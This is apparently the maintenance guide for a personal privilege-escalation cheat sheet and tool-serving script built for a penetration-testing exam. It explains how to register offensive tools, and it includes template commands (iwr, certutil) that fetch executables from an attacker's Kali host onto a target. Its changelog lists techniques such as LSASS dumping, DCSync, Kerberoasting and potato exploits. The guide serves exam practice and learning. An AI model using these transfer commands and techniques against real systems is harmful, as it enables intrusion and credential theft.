# MahiestaPrivEsc — Contributor & Maintenance Guide

This document explains the full architecture so any AI or developer can add tools,
commands, tips, or sections without breaking anything.

---

## Project Architecture

```
project1337/
├── privesc.html          ← The main single-file reference guide (HTML + CSS + JS)
├── ToolKitDownloader.py  ← Downloads/serves ALL tools; run this on Kali before an exam
├── Accesschk.ps1         ← Local bundled PS script (served from scripts/)
├── painkiller/           ← Legacy shell scripts (linpain.sh, painkillerV2.sh, etc.)
├── missing/              ← JSON data files for the guide's dynamic features
└── CONTRIBUTE.md         ← This file
```

**Workflow on exam day:**
```
python3 ToolKitDownloader.py          # downloads all tools → ~/privesc-toolkit/
                                      # starts HTTP server on random port
                                      # prints the port + target download commands
# Open http://<kali-ip>:<port>/privesc.html in browser
# Fill KALI_IP and PORT in the varbar — all commands auto-update
```

**Served directory structure** (everything under `~/privesc-toolkit/`):
```
~/privesc-toolkit/
├── windows/      ← Windows EXEs and extracted archive contents
├── scripts/      ← PowerShell scripts
├── linux/        ← Linux binaries and scripts
├── repos/        ← Git repos (cloned, not served directly)
└── privesc.html  ← Copy of the guide
```

---

## How to Add a New Downloadable Tool (EXE / Binary)

### Step 1 — Add to `ToolKitDownloader.py`

Open `ToolKitDownloader.py` and find the `TOOLS` dict. Add an entry to the right category:

```python
# In TOOLS["windows"] for Windows EXEs:
{"name": "MyTool.exe", "cat": "privesc", "url": "https://github.com/author/repo/releases/latest/download/MyTool.exe"},

# If it's a zip/archive that needs extraction:
{"name": "MyTool.zip", "cat": "privesc", "url": "https://github.com/.../MyTool.zip", "extract": True},

# In TOOLS["linux"] for Linux binaries:
{"name": "mytool", "cat": "enum", "url": "https://github.com/author/repo/releases/latest/download/mytool_linux_amd64"},

# In TOOLS["scripts"] for PowerShell scripts:
{"name": "MyScript.ps1", "cat": "privesc", "url": "https://raw.githubusercontent.com/author/repo/main/MyScript.ps1"},
```

**`cat` values** (for labelling, no functional impact):
`enum` · `privesc` · `potato` · `tokens` · `creds` · `ad` · `net` · `tunnel` · `shells` · `lateral` · `exploit-suggest` · `static` · `proc`

**For extracted archives** — the zip/gz is downloaded to `windows/MyTool.zip` and
extracted INTO `windows/`. The served path depends on what filenames are inside the archive.
Always check what the archive actually contains before writing the HTML path.

### Step 2 — Add to `TOOL_MAP` in `privesc.html`

Find `const TOOL_MAP = {` (around line 6180) and add:

```javascript
'MyTool.exe':'windows/MyTool.exe',          // Windows binary
'MyScript.ps1':'scripts/MyScript.ps1',      // PS script
'mytool':'linux/mytool',                    // Linux binary
// For archive-extracted files, use the EXTRACTED filename, not the zip name:
'mimikatz.exe':'windows/x64/mimikatz.exe',  // ← mimikatz_trunk.zip extracts to x64/ subfolder
```

**Critical rule:** The TOOL_MAP path must match the ACTUAL file that ends up on disk after
download/extraction. If a zip extracts into a subdirectory, reflect that in the path.
Check by running `ToolKitDownloader.py --list` and looking at what lands in `~/privesc-toolkit/`.

### Step 3 — Add to `TOOL_CATALOG` in `privesc.html`

Find `const TOOL_CATALOG = [` (around line 6220) and add an entry:

```javascript
// Windows EXE:
{n:'MyTool.exe', p:'windows/MyTool.exe', k:'win', c:'privesc'},

// PowerShell script:
{n:'MyScript.ps1', p:'scripts/MyScript.ps1', k:'ps', c:'privesc'},

// Linux binary:
{n:'mytool', p:'linux/mytool', k:'lin', c:'enum'},
```

Fields:
- `n` — filename (shown in the UI and used to build download commands)
- `p` — path relative to toolkit root (must match TOOL_MAP)
- `k` — kind: `'win'` / `'ps'` / `'lin'`
- `c` — category label (same values as ToolKitDownloader `cat`)

This is what powers the **⬇ Tools** modal in the topbar.

### Step 4 — Add Download Commands in the HTML Body

Find the relevant section in `privesc.html` and add a download block:

```html
<!-- Standard download block pattern: -->
<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download MyTool to target</div>
<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/MyTool.exe -Outfile {{WPATH}}\MyTool.exe</pre></div>
<div class="alts">
  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/MyTool.exe {{WPATH}}\MyTool.exe</code> — CMD (no PS)</div>
</div>
```

**Variable placeholders** — always use these, they auto-fill from the varbar:
| Placeholder | Example value | Meaning |
|---|---|---|
| `{{KALI_IP}}` | 10.10.14.1 | Kali attack IP |
| `{{PORT}}` | 46433 | Toolkit HTTP server port |
| `{{RPORT}}` | 4444 | Reverse shell listener port |
| `{{TARGET}}` | 192.168.45.10 | Target IP |
| `{{USER}}` | Administrator | Username |
| `{{PASS}}` | Password123 | Password |
| `{{DOMAIN}}` | corp.local | AD domain |
| `{{WPATH}}` | C:\Temp | Windows drop path |
| `{{LFILE}}` | /tmp/shell.sh | Linux target file path |

---

## How to Add a Local Bundled Script (no download URL)

Use this for scripts you write yourself (like `Accesschk.ps1`).

### Step 1 — Place the file in the project root

```
project1337/MyScript.ps1
```

### Step 2 — Add to ToolKitDownloader.py with `"local": True`

```python
# In TOOLS["scripts"]:
{"name": "MyScript.ps1", "cat": "privesc", "local": True},
```

The `copy_local_files()` function in `ToolKitDownloader.py` will copy it to
`~/privesc-toolkit/scripts/MyScript.ps1` every time the downloader runs.
No URL needed — it's served from your local copy.

### Steps 3 & 4 — Same as above (TOOL_MAP, TOOL_CATALOG, HTML body)

---

## How to Add a New HTML Section

Sections are inside `<div id="content">` in `privesc.html`.

### Section skeleton:

```html
<section class="section" id="your-section-id">
<div class="section-header">
  <div>
    <div class="section-num">8.5</div>
    <div class="section-title">Your Section Title</div>
    <div class="section-subtitle">Brief one-liner describing when to use this</div>
  </div>
  <div class="badges">
    <span class="badge badge-privesc">PRIVESC</span>
    <!-- badge-enum · badge-privesc · badge-exploit · badge-creds -->
  </div>
</div>

<!-- content goes here -->

</section>
```

### Add it to the sidebar

Find `<div id="sidebar">` and add a link in the right group:

```html
<a class="sb-item" href="#your-section-id">
  <span class="num">8.5</span>Your Section Title
  <span class="dot" data-sec="your-section-id" onclick="cycleProgress(event,'your-section-id')"></span>
</a>
```

The dot cycles: grey → orange (tried) → green (works) → red (skip). State is saved in localStorage.

---

## Content Block Reference

### Command block (copy-on-click, auto variable substitution)

```html
<div class="cmd-wrap">
  <div class="cmd-label">What this command does</div>
  <pre class="cmd">your command here with {{KALI_IP}} placeholders</pre>
</div>
```

### Alternative commands (shown below the main block)

```html
<div class="alts">
  <div class="alt-item">
    <span class="alt-arrow">&#8594;</span>
    <code class="alt-cmd">alternate command</code> — explanation
  </div>
</div>
```

### Subsection heading

```html
<div class="subsection">
  <div class="subsection-title">Sub-topic Name</div>
  <!-- commands go here -->
</div>
```

### Callout boxes

```html
<div class="callout callout-tip">
  <strong>Tip title</strong> Body text here.
</div>

<div class="callout callout-warn">
  <strong>Warning</strong> Careful about X.
</div>

<div class="callout callout-info">
  <strong>Info</strong> Context about this technique.
</div>

<div class="callout callout-danger">
  <strong>Danger</strong> This can brick the machine.
</div>
```

### Pipeline (step-by-step attack flow)

```html
<div class="pipeline">
  <div class="pipe-step pipe-detect">
    <span class="pipe-step-label">1. DETECT</span>
    <!-- commands -->
  </div>
  <div class="pipe-step pipe-confirm">
    <span class="pipe-step-label">2. CONFIRM</span>
  </div>
  <div class="pipe-step pipe-exploit">
    <span class="pipe-step-label">3. EXPLOIT</span>
  </div>
  <div class="pipe-step pipe-verify">
    <span class="pipe-step-label">4. VERIFY</span>
  </div>
  <div class="pipe-step pipe-kali">
    <span class="pipe-step-label">KALI — prepare</span>
  </div>
</div>
```

Pipe step colours: `pipe-detect`=yellow · `pipe-confirm`=cyan · `pipe-exploit`=red ·
`pipe-verify`=green · `pipe-backup`=teal · `pipe-restore`=orange · `pipe-kali`=purple

### Smart transfer block (auto-generates download commands when KALI_IP is set)

```html
<div class="auto-xfer" data-tools='["MyTool.exe","MyScript.ps1"]'>
  <div class="xfer-header" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='none'?'block':'none'">
    &#11015; Download these tools <span class="xfer-toggle">(expand)</span>
  </div>
  <div class="xfer-body" style="display:none"></div>
</div>
```

The tool names must exist in `TOOL_MAP`. Commands auto-populate when KALI_IP+PORT are set.

---

## Common Mistakes to Avoid

1. **Wrong server path for extracted archives** — if you download `Foo.zip` and it extracts
   to `windows/x64/foo.exe`, the HTML path must be `/windows/x64/foo.exe` NOT `/windows/foo.exe`.
   Always verify with `unzip -l Foo.zip` before writing the path.

2. **Missing `/windows/` or `/linux/` prefix** — all served paths are relative to the toolkit
   root. A file at `~/privesc-toolkit/windows/nc64.exe` is served as `/windows/nc64.exe`.
   Paths like `/nc64.exe` or `/SharpHound.exe` will 404.

3. **certutil on every machine** — certutil may be blocked/missing. Always provide an `iwr`
   (PowerShell) alternative AND a `(New-Object Net.WebClient).DownloadFile(...)` fallback.
   For Linux, provide both `wget` and `curl`.

4. **accesschk.exe /accepteula hang** — new Sysinternals versions pop a GUI. The toolkit
   serves the old v5.x from the zip. If in doubt, use `Accesschk.ps1` instead.

5. **TOOL_MAP vs TOOL_CATALOG divergence** — both must have the same path for a given tool.
   If you update one, update the other. TOOL_MAP powers the smart `auto-xfer` blocks;
   TOOL_CATALOG powers the ⬇ Tools modal.

6. **Forgetting `"extract": True`** — if you add a zip/gz/tar.gz and don't set this, only
   the archive file will be served, not the extracted binary.

---

## Adding a Tip to an Existing Section

Just drop a callout anywhere inside a `<section>`:

```html
<div class="callout callout-tip">
  <strong>Pro tip: something the reader might miss</strong>
  Explanation of the non-obvious thing.
</div>
```

No registration needed. Callouts render inline.

---

## Updating the Decision Tree / Compat Table

These are driven by JSON files in `missing/`:
- `missing/decision_tree.json` — the interactive privesc decision tree
- `missing/os_compat.json` — the OS × exploit compatibility table
- `missing/vectors_win.json` — Windows privesc vectors for the SI parser
- `missing/vectors_lin.json` — Linux privesc vectors

Edit the JSON to add new nodes/entries. The JS in `privesc.html` reads these at page load
(they're embedded inline during build — search for the JSON variable names in the `<script>`
section to find where they're inlined).

---

## Quick Checklist for Adding a New Tool

- [ ] Add entry to `TOOLS["windows"|"scripts"|"linux"]` in `ToolKitDownloader.py`
- [ ] Verify the actual extracted filename (for archives)
- [ ] Add `'filename':'path/filename'` to `TOOL_MAP` in `privesc.html`
- [ ] Add `{n,p,k,c}` entry to `TOOL_CATALOG` in `privesc.html`
- [ ] Add download commands (iwr + certutil alts) in the relevant HTML section
- [ ] If local script: place file in project root and use `"local": True`
- [ ] Test: run `ToolKitDownloader.py --serve-only` and curl the path to verify it 200s

---

## Changelog

### Session 5 — 2026-04-26 (Notes Completion Pass)

**Added to `privesc.html`:**

1. **DCOMPotato subsection** (§7.14) — Was in the original notes (7.14.1) but missing from HTML.
   Added: compat table row, TRANSFER/TEST/REV SHELL/ADD ADMIN commands, info callout.

2. **RottenPotato subsection** (§7.14) — Was in original notes (7.14.8) but missing from HTML.
   Added: TRANSFER/RUN commands, warning callout noting JuicyPotato/GodPotato supersede it,
   decision tip for tool selection.

3. **Potato compat table expanded** — Added DCOMPotato and RottenPotato rows to the OS
   compatibility table so the quick-reference matches all 11 potato variants from the notes.

4. **PowerSharpPack tool card expanded** (§7.13) — Notes had 13 additional sub-tools not shown
   in the HTML. Added grouped commands for:
   - Enum/Privesc: InternalMonologue, SharpWeb, SharpChromium, SharpCloud
   - AD/Kerberos: SharpView, Grouper2
   - Persistence/Lateral: SharPersist, UrbanBishop
   - Recon: SharpShares, SharpSniper, SauronEye, SharpSpray, SharpGPOAbuse
   Also added multi-param tip callout.

5. **Linux Capabilities table expanded** (§8.5) — Notes had 16 capabilities; HTML only had 10.
   Added the 7 missing entries: CAP_AUDIT_CONTROL, CAP_SETGID, CAP_SETPCAP, CAP_IPC_LOCK,
   CAP_MAC_ADMIN, CAP_BLOCK_SUSPEND (and improved CAP_AUDIT_WRITE description).

---

### Session 4 — (prior session) — Major Build Pass

**Added to `privesc.html`:**
- §7.16 UAC Bypass — full Fodhelper/EventViewer/CMSTP/Disk Cleanup pipeline
- §7.17 LSASS Dump — comsvcs MiniDump, procdump, nanodump, pypykatz
- §7.18 Credential Manager — cmdkey /list, vault extraction, mimikatz sekurlsa
- §7.19 Weak Registry Service DACL — sc sdshow, accesschk, sc config exploitation
- §7.20 LAPS — detect, read via impacket, enumerate who can read
- §7.21 Kerberoasting & AS-REP Roasting — impacket + Rubeus
- §7.22 DNSAdmins DLL Hijack — full pipeline
- §7.23 DCSync & ACL Abuse — secretsdump, mimikatz, WriteDACL/GenericAll/ACL chain
- §8.x many Linux bonus sections (fail2ban, update-motd.d, LXD, screen, chkrootkit, etc.)
- Tool Catalog modal (⬇ Tools button in topbar)
- Accesschk.ps1 bundled local script
- SI Parser, OS Compat Table, Decision Tree, Shell Stabilization Panel (data-driven)
- 18 command fixes identified and corrected in audit pass

---

## Notes-vs-HTML Coverage Checklist

### Windows (from `windows_priv_esc` notes)

- [x] 7.1 Enumeration — complete
- [x] 7.2 Finding Files & Directories — complete
- [x] 7.3 PowerShell Goldmine (Logs & History) — complete
- [x] 7.4 Abusing Privileges — complete (table + FullPowers)
- [x] 7.5 Service Binary Hijacking — complete with pipeline
- [x] 7.6 Service DLL Hijacking — complete with pipeline
- [x] 7.7 Unquoted Service Paths — complete
- [x] 7.8 Scheduled Tasks — complete
- [x] 7.9 Internal Services — complete
- [x] 7.10 Cleartext Password Finding — complete (findstr, configs, sysprep, VNC)
- [x] 7.11 Shadow Copies (SAM/SYSTEM/NTDS.dit/SECURITY/NTUSER.dat) — complete
- [x] 7.12 AlwaysInstallElevated — complete
- [x] 7.13.1 WinPEAS — complete
- [x] 7.13.2 PowerUp — complete
- [x] 7.13.3 PowerCat — complete
- [x] 7.13.4 PowerView — complete (in AD sections)
- [x] 7.13.5 PowerMad — complete
- [x] 7.13.6 PrivescCheck — complete (with dot-source warning)
- [x] 7.13.7 Seatbelt — complete
- [x] 7.13.8 PowerSharpPack — complete (expanded with all 13 sub-tools — Session 5)
- [x] 7.14.1 DCOMPotato — **added Session 5**
- [x] 7.14.2 EfsPotato — complete
- [x] 7.14.3 GodPotato — complete
- [x] 7.14.4 HotPotato — complete
- [x] 7.14.5 JuicyPotato — complete (with CLSID table)
- [x] 7.14.6 PrintSpoofer — complete
- [x] 7.14.7 RoguePotato — complete
- [x] 7.14.8 RottenPotato — **added Session 5**
- [x] 7.14.9 SharpEfsPotato — complete
- [x] 7.14.10 SigmaPotato — complete
- [x] 7.14.11 SweetPotato — complete
- [x] 7.15.1 CVE-2023-29360 — complete
- [x] 7.15.2 SeAssignPrimaryToken — complete (in §7.14 + table)
- [x] 7.15.3 SeBackupPrivilege — complete
- [x] 7.15.4 SeDebugPrivilege — complete
- [x] 7.15.5 SeImpersonatePrivilege — complete (§7.14 + decision tree)
- [x] 7.15.6 SeManageVolumeAbuse — complete (full pipeline)
- [x] 7.15.7 SeRestorePrivilege — complete

### Linux (from `linux_priv_esc` notes)

- [x] 8.1 Enumeration — complete
- [x] 8.2 Service Footprints / Sniffing — complete
- [x] 8.3 Cron Job Abuse — complete
- [x] 8.4.1 /etc/passwd — complete
- [x] 8.4.2 /etc/shadow — complete
- [x] 8.5.1 Setuid Binaries — complete
- [x] 8.5.2 Exploiting Setuid Binaries — complete
- [x] 8.5.3 Capabilities — complete (getcap, setcap commands)
- [x] 8.5.4 Capabilities Table — **expanded Session 5** (was 10 entries, now 17)
- [x] 8.6 Sudo Abuse — complete (sudo -l + GTFOBins + wildcard injection)
- [x] 8.7 Kernel Exploits — complete (CVE table with links)
- [x] 8.8 Wildcard Injection — complete (tar, chown, chmod)
- [x] 8.9 Disk Group Permissions — complete
- [x] 8.10 MySQL as Root — complete
- [x] 8.11 User-Installed Software — complete
- [x] 8.12 Weak/Reused/Plaintext Passwords — complete
- [x] 8.13 Internal Services — complete
- [x] 8.14 World-Writable Scripts Run as Root — complete
- [x] 8.15 Unmounted Filesystems — complete
- [x] 8.16 SUID/GUID — complete (full guide + GTFOBins integration)
- [x] 8.17.1 LinPEAS — complete
- [x] 8.17.2 LinEnum — complete
- [x] 8.17.3 unix-privesc-check — complete
- [x] 8.17.4 Checksec — complete
- [x] 8.17.5 Peepdf — complete
- [x] 8.17.6 Exploit Suggester — complete

### Extra sections in HTML (beyond the notes)

- [x] §7.16 UAC Bypass — added (not in original notes)
- [x] §7.17 LSASS Dump — added (not in original notes)
- [x] §7.18 Credential Manager — added (not in original notes)
- [x] §7.19 Weak Registry Service DACL — added (not in original notes)
- [x] §7.20 LAPS — added (not in original notes)
- [x] §7.21 Kerberoasting & AS-REP Roasting — added (not in original notes)
- [x] §7.22 DNSAdmins DLL Hijack — added (not in original notes)
- [x] §7.23 DCSync & ACL Abuse — added (not in original notes)
- [x] §7.15b Windows Kernel Exploit Reference — added (enhanced CVE table)
- [x] NFS no_root_squash, Docker/LXC, LD_PRELOAD, PATH Hijacking, PYTHONPATH — added
- [x] Restricted Shell Escape, LXD Group, chkrootkit, GNU screen CVE — added
- [x] Git Hooks & Gitea, fail2ban, update-motd.d, Tmux session hijack — added
- [x] GTFOBins mini-lookup, Reverse Shell Generator, Shell Stabilization panel — added
- [x] File Transfer Quick-Ref, Proof Collection, Tool Catalog modal — added
- [x] Decision Tree, OS Compat Table, SI Parser — added

### Known Gaps / TODO

- [x] `RottenPotato.exe` — added to `ToolKitDownloader.py`, `TOOL_MAP`, `TOOL_CATALOG`. URL verified 200 OK.
- [x] `DCOMPotato.exe` — added to `TOOL_MAP`, `TOOL_CATALOG` in HTML for documentation/commands. **No public precompiled binary exists.** ToolKitDownloader.py entry is commented out. Must compile from source: https://github.com/zcgonvh/DCOMPotato. HTML section has a warning callout and fallback to GodPotato.
- [x] Line 145 indentation fix in `ToolKitDownloader.py` (cosmetic — chisel_win.zip was missing leading spaces)
- [x] PowerSharpPack sub-tools (SharpChromium, SharpCloud, etc.) served via the main PS1 — no individual TOOL_MAP entries needed
